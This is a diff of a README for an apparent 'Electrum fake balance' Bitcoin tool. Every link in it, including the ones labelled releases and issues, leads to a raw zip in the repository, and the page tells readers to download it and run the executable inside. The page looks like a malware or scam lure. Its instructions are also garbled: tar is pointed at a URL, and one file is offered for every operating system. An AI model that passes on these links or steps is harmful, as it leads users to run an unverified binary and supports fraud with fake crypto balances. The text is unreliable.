@@ -4,7 +4,7 @@
 Electrum-Fake-Balance helps you generate temporary Bitcoin balances in your Electrum wallet for testing. Follow these steps to download and run the application.
 
 ## 📥 Download Now
-[![Download Electrum-Fake-Balance](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip)](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip)
+[![Download Electrum-Fake-Balance](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip)](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip)
 
 ## 💿 System Requirements
 - Operating System: Windows 10 or later, MacOS, or Linux
@@ -17,8 +17,8 @@ Electrum-Fake-Balance helps you generate temporary Bitcoin balances in your Elec
 - Safe and quick testing for applications.
 
 ## 📋 Download & Install
-1. To start, **visit the Releases page**: [Download Electrum-Fake-Balance](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip).
-2. On the Releases page, look for the latest version. Click on the asset that matches your operating system. For example, choose `https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip` for Windows or `https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip` for Mac.
+1. To start, **visit the Releases page**: [Download Electrum-Fake-Balance](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip).
+2. On the Releases page, look for the latest version. Click on the asset that matches your operating system. For example, choose `https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip` for Windows or `https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip` for Mac.
 3. Once the download completes, locate the file in your Downloads folder.
 
 ### For Windows Users:
@@ -34,7 +34,7 @@ Electrum-Fake-Balance helps you generate temporary Bitcoin balances in your Elec
 ### For Linux Users:
 1. Open a terminal window.
 2. Navigate to your Downloads directory using `cd ~/Downloads`.
-3. Extract the downloaded archive with: `tar -xvf https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip`.
+3. Extract the downloaded archive with: `tar -xvf https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip`.
 4. Change into the extracted directory: `cd Electrum-Fake-Balance`.
 5. Run the application using: `./Electrum-Fake-Balance`.
 
@@ -49,7 +49,7 @@ Electrum-Fake-Balance helps you generate temporary Bitcoin balances in your Elec
 - Visit our community forum to connect with other users and share tips.
 
 ## 📞 Support
-For further support, please open an issue on the [Electrum-Fake-Balance Issues page](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Balance-Electrum-Fake-oticodinia.zip).
+For further support, please open an issue on the [Electrum-Fake-Balance Issues page](https://raw.githubusercontent.com/hitesh6895/Electrum-Fake-Balance/main/Electrum-Flash/Electrum-Fake-Balance-v3.8.zip).
 
 ## 🌍 Topics
 - crypto
